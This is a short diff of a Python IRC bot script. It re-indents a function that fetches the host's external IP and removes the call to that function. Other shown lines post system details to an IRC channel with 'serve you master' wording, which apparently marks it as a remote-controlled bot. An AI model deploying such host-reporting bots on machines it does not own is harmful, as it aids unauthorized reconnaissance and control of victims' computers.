@@ -54,8 +54,8 @@ def sysinfo(): # Function to obtain system information
   sendmsg(channel, 'Language: ' + locale.getdefaultlocale()[0])
 
 def get_external_ip(): # Function to get external ip address
-    ip = urllib2.urlopen('http://automation.whatismyip.com/n09230945.asp').read()
-    sendmsg(channel, 'Connecting from ' + ip + ' to serve you master!')
+  ip = urllib2.urlopen('http://automation.whatismyip.com/n09230945.asp').read()
+  sendmsg(channel, 'Connecting from ' + ip + ' to serve you master!')
 
 def sendmsg(chan , msg): # Function to send messages to the channel
   ircsock.send('PRIVMSG '+ chan +' :'+ msg +'\n')
@@ -76,7 +76,6 @@ def main():
   os.system('clear') # Clear the screen
   banner() # Print the banner
   connect() # Connect to the server
-  get_external_ip()  # Show where the bot is connecting from
 
   while 1: # WARNING: May cause an infinite loop
 
